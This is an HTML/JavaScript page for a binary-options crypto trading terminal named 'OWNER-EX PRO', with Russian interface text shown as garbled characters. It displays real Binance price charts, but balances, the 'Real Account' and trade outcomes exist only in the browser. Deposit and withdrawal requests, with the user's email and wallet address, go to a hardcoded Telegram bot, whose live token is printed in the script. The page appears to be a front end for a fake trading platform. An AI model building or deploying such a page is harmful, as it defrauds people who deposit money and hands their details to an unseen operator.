<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OWNER-EX PRO</title>
    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%230ecb81%22/><text y=%22.9em%22 font-size=%2280%22 font-weight=%22900%22 x=%2250%%22 text-anchor=%22middle%22 fill=%22%23000%22>E</text></svg>">
    
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

        :root {
            --bg: #0b0e11;
            --panel: #161a1e;
            --accent: #0ecb81;
            --red: #f6465d;
            --green: #0ecb81;
            --border: #2b2f36;
            --input-bg: #000000;
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: #eaecef;
            font-family: 'Inter', sans-serif;
            height: 100%;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            -webkit-tap-highlight-color: transparent;
        }

        /* --- AUTH SCREEN --- */
        #authScreen {
            position: fixed; inset: 0; background: var(--bg); z-index: 9999;
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }
        .auth-card {
            background: var(--panel); padding: 30px; border-radius: 20px;
            width: 100%; max-width: 360px; border: 1px solid var(--border);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
        }
        .auth-logo { font-weight: 900; font-size: 24px; color: var(--accent); margin-bottom: 25px; letter-spacing: -1px; }

        /* --- HEADER --- */
        header {
            height: 65px; background: var(--panel);
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 15px; flex-shrink: 0; z-index: 100;
        }

        .asset-btn {
            background: var(--input-bg); border: 1px solid var(--border);
            padding: 8px 12px; border-radius: 8px; display: flex; align-items: center;
            gap: 10px; cursor: pointer;
        }
        .asset-btn span { font-weight: 800; font-size: 13px; }

        .balance-box { text-align: right; }
        .bal-val { color: var(--accent); font-weight: 900; font-size: 18px; }
        .bal-label { font-size: 10px; color: #555; font-weight: 700; text-transform: uppercase; }

        /* --- LAYOUT --- */
        .terminal-container { display: flex; flex-direction: column; flex: 1; min-height: 0; }

        /* CHART AREA */
        .chart-section { flex: 1; display: flex; flex-direction: column; background: #000; position: relative; }
        #chart { flex: 1; width: 100%; }

        /* NAVIGATION */
        .side-nav {
            order: 3; height: 70px; background: var(--panel);
            border-top: 1px solid var(--border);
            display: flex; justify-content: space-around; align-items: center;
        }
        .nav-item { font-size: 22px; color: #848e9c; cursor: pointer; transition: 0.2s; }
        .nav-item.active { color: var(--accent); }

        /* TRADE PANEL (BEAUTIFIED) */
        .trade-panel {
            background: var(--panel); border-top: 1px solid var(--border);
            padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
        }
        .trade-input-box {
            background: var(--input-bg); border: 1px solid var(--border);
            padding: 10px 15px; border-radius: 12px;
        }
        .trade-input-box label { font-size: 10px; color: #555; font-weight: 800; display: block; margin-bottom: 5px; }
        .trade-input-box input {
            background: transparent; border: none; color: #fff; width: 100%;
            font-size: 20px; font-weight: 900; outline: none;
        }

        .btn-trade {
            height: 60px; border: none; border-radius: 12px;
            font-weight: 900; font-size: 18px; cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            transition: transform 0.1s;
        }
        .btn-up { background: var(--green); color: #000; box-shadow: 0 4px 15px rgba(14, 203, 129, 0.2); }
        .btn-down { background: var(--red); color: #fff; box-shadow: 0 4px 15px rgba(246, 70, 93, 0.2); }
        .btn-trade:active { transform: scale(0.95); }

        /* HISTORY */
        .history-mini {
            background: rgba(0,0,0,0.5); border-top: 1px solid var(--border);
            max-height: 100px; overflow-y: auto; font-size: 11px;
        }
        .h-row { display: flex; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #111; font-weight: 700; }

        /* DROPDOWNS & MODALS */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 2000; display: none; padding: 20px; align-items: center; justify-content: center;
            backdrop-filter: blur(10px);
        }
        .custom-input {
            width: 100%; background: var(--input-bg); border: 1px solid var(--border);
            color: #fff; padding: 18px; border-radius: 12px; margin-bottom: 15px;
            font-size: 15px; font-weight: 600; box-sizing: border-box;
        }

        /* ASSET DROPDOWN */
        .asset-list {
            position: absolute; top: 75px; left: 15px; right: 15px;
            background: var(--panel); border: 1px solid var(--border);
            border-radius: 15px; display: none; z-index: 1000; overflow: hidden;
        }
        .asset-item {
            padding: 15px; display: flex; justify-content: space-between;
            border-bottom: 1px solid var(--border); font-weight: 700;
        }

        /* DESKTOP ADAPTATION */
        @media (min-width: 1024px) {
            .terminal-container { flex-direction: row; }
            .side-nav { flex-direction: column; order: 0; width: 70px; height: 100%; border-right: 1px solid var(--border); border-top: none; }
            .trade-panel { width: 320px; display: flex; flex-direction: column; height: 100%; border-left: 1px solid var(--border); padding: 30px; }
            .btn-trade { height: 70px; }
        }
    </style>
</head>
<body>

<div id="authScreen">
    <div class="auth-card">
        <div class="auth-logo">OWNER-EX</div>
        <input type="email" id="authEmail" class="custom-input" placeholder="Email">
        <input type="password" id="authPass" class="custom-input" placeholder="–ü–∞—Ä–æ–ª—å">
        <button onclick="handleAuth()" class="btn-trade btn-up" style="width:100%;">–ù–ê–ß–ê–¢–¨ –¢–û–†–ì–û–í–ê–¢–¨</button>
    </div>
</div>

<header>
    <div class="asset-btn" onclick="toggleAssets()">
        <i class="fab fa-bitcoin" id="curIcon" style="color:var(--accent)"></i>
        <span id="curName">BTC / USDT</span>
        <i class="fas fa-chevron-down" style="font-size: 10px; opacity: 0.3;"></i>
    </div>
    
    <div class="balance-box" onclick="toggleAcc()">
        <div class="bal-val" id="mainBal">$10,000.00</div>
        <div class="bal-label" id="accLabel">Demo Account</div>
    </div>
</header>

<div id="assetList" class="asset-list">
    <div class="asset-item" onclick="selectAsset('BTCUSDT', 'BTC / USDT', 'fa-bitcoin', 82)">
        <span>BTC / USDT</span> <span style="color:var(--accent)">82%</span>
    </div>
    <div class="asset-item" onclick="selectAsset('ETHUSDT', 'ETH / USDT', 'fa-ethereum', 82)">
        <span>ETH / USDT</span> <span style="color:var(--accent)">82%</span>
    </div>
    <div class="asset-item" onclick="selectAsset('SOLUSDT', 'SOL / USDT', 'fa-coins', 80)">
        <span>SOL / USDT</span> <span style="color:var(--accent)">80%</span>
    </div>
</div>

<div class="terminal-container">
    <div class="side-nav">
        <i class="fas fa-chart-line nav-item active"></i>
        <i class="fas fa-wallet nav-item" onclick="openModal('cashModal')"></i>
        <i class="fas fa-user nav-item" onclick="openModal('profModal')"></i>
        <i class="fas fa-sign-out-alt nav-item" onclick="logout()" style="color:var(--red); opacity: 0.5;"></i>
    </div>

    <div class="chart-section">
        <div id="chart"></div>
        <div class="history-mini" id="hBody">
            </div>
    </div>

    <div class="trade-panel">
        <div class="trade-input-box">
            <label>–ò–ù–í–ï–°–¢–ò–¶–ò–Ø (USDT)</label>
            <input type="number" id="tAmt" value="100">
        </div>
        <div class="trade-input-box">
            <label>–í–†–ï–ú–Ø (–°–ï–ö–£–ù–î–´)</label>
            <input type="number" id="tTime" value="30">
        </div>
        <button class="btn-trade btn-up" onclick="makeTrade('CALL')">–í–´–®–ï ‚Üë</button>
        <button class="btn-trade btn-down" onclick="makeTrade('PUT')">–ù–ò–ñ–ï ‚Üì</button>
    </div>
</div>

<div id="cashModal" class="modal-overlay">
    <div class="auth-card" style="max-width: 400px;">
        <div style="display:flex; gap:10px; margin-bottom:20px;">
            <button class="btn-trade btn-up" style="flex:1; height:45px; font-size:12px;" onclick="switchCash('dep')">–î–ï–ü–û–ó–ò–¢</button>
            <button class="btn-trade" style="flex:1; height:45px; font-size:12px; background:#222; color:#fff;" onclick="switchCash('wit')">–í–´–í–û–î</button>
        </div>
        <div id="cashContent">
            <input type="number" id="cSum" class="custom-input" placeholder="–°—É–º–º–∞ ($)">
            <input type="text" id="wAddr" class="custom-input" placeholder="–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞" style="display:none;">
            <button class="btn-trade btn-up" style="width:100%;" onclick="processCash()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
        </div>
        <p onclick="closeModals()" style="margin-top:20px; color:#555; cursor:pointer; font-size:12px;">–û–¢–ú–ï–ù–ê</p>
    </div>
</div>

<div id="profModal" class="modal-overlay">
    <div class="auth-card">
        <h3 style="margin-bottom:20px;">–ü–†–û–§–ò–õ–¨</h3>
        <input type="text" id="pNick" class="custom-input" placeholder="–ù–∏–∫–Ω–µ–π–º">
        <input type="text" id="pPromo" class="custom-input" placeholder="–ü—Ä–æ–º–æ–∫–æ–¥">
        <button class="btn-trade btn-up" style="width:100%;" onclick="saveProf()">–°–û–•–†–ê–ù–ò–¢–¨</button>
        <p onclick="closeModals()" style="margin-top:20px; color:#555; cursor:pointer; font-size:12px;">–ó–ê–ö–†–´–¢–¨</p>
    </div>
</div>

<script>
    const BOT_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
    const CHAT_ID = "6426834853";

    let balances = JSON.parse(localStorage.getItem('owner_bals')) || { demo: 10000, real: 0 };
    let sessionUser = localStorage.getItem('owner_session') || null;
    let trades = JSON.parse(localStorage.getItem('owner_trades')) || [];
    let activeAcc = 'demo', curPrice = 0, curSym = 'BTCUSDT', cashMode = 'dep';
    let chart, series;

    function handleAuth() {
        const e = document.getElementById('authEmail').value;
        if(!e) return alert("–í–≤–µ–¥–∏—Ç–µ Email");
        sessionUser = e; localStorage.setItem('owner_session', e);
        document.getElementById('authScreen').style.display = 'none';
        initApp();
    }

    function initApp() {
        initChart();
        updateUI();
        syncData();
    }

    function initChart() {
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#000' }, textColor: '#555' },
            grid: { vertLines: { visible: false }, horzLines: { color: '#111' } },
            crosshair: { mode: LightweightCharts.CrosshairMode.Normal },
            timeScale: { borderColor: '#222' },
            rightPriceScale: { borderColor: '#222' }
        });
        series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false, wickUpColor: '#0ecb81', wickDownColor: '#f6465d' });
    }

    function syncData() {
        if(window.ws) window.ws.close();
        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
        window.ws.onmessage = e => {
            const k = JSON.parse(e.data).k; curPrice = +k.c;
            series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: curPrice });
        };
    }

    function makeTrade(type) {
        const amt = parseFloat(document.getElementById('tAmt').value);
        if(amt > balances[activeAcc]) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤");
        
        balances[activeAcc] -= amt; updateUI();
        const startP = curPrice;

        setTimeout(() => {
            const win = (type === 'CALL' && curPrice > startP) || (type === 'PUT' && curPrice < startP);
            const res = win ? (amt * 0.82) : -amt;
            if(win) balances[activeAcc] += (amt + res);
            
            trades.unshift({ s: curSym, res: (win ? '+' : '-') + Math.abs(res).toFixed(2), win });
            localStorage.setItem('owner_bals', JSON.stringify(balances));
            localStorage.setItem('owner_trades', JSON.stringify(trades));
            updateUI();
        }, document.getElementById('tTime').value * 1000);
    }

    function updateUI() {
        document.getElementById('mainBal').innerText = `$${balances[activeAcc].toLocaleString()}`;
        document.getElementById('hBody').innerHTML = trades.slice(0,5).map(t => `
            <div class="h-row">
                <span>${t.s}</span>
                <span style="color:${t.win ? '#0ecb81' : '#f6465d'}">${t.res}</span>
            </div>
        `).join('');
    }

    function toggleAssets() { const l = document.getElementById('assetList'); l.style.display = l.style.display === 'block' ? 'none' : 'block'; }
    function selectAsset(id, name, icon, payout) {
        curSym = id; document.getElementById('curName').innerText = name;
        document.getElementById('curIcon').className = `fab ${icon}`;
        toggleAssets(); syncData();
    }

    function toggleAcc() { activeAcc = activeAcc === 'demo' ? 'real' : 'demo'; document.getElementById('accLabel').innerText = activeAcc === 'demo' ? 'Demo Account' : 'Real Account'; updateUI(); }
    function switchCash(m) { cashMode = m; document.getElementById('wAddr').style.display = m === 'wit' ? 'block' : 'none'; }
    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); }
    function logout() { localStorage.removeItem('owner_session'); location.reload(); }

    function processCash() {
        const s = document.getElementById('cSum').value;
        const a = document.getElementById('wAddr').value;
        const msg = cashMode === 'dep' ? `üí∞ –î–ï–ü–û–ó–ò–¢: ${sessionUser} –Ω–∞ $${s}` : `üì§ –í–´–í–û–î: ${sessionUser} –Ω–∞ $${s}\n–ê–¥—Ä–µ—Å: ${a}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("–ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!"); closeModals();
    }

    window.onload = () => { if(sessionUser) { document.getElementById('authScreen').style.display = 'none'; initApp(); } };
</script>
</body>
</html>
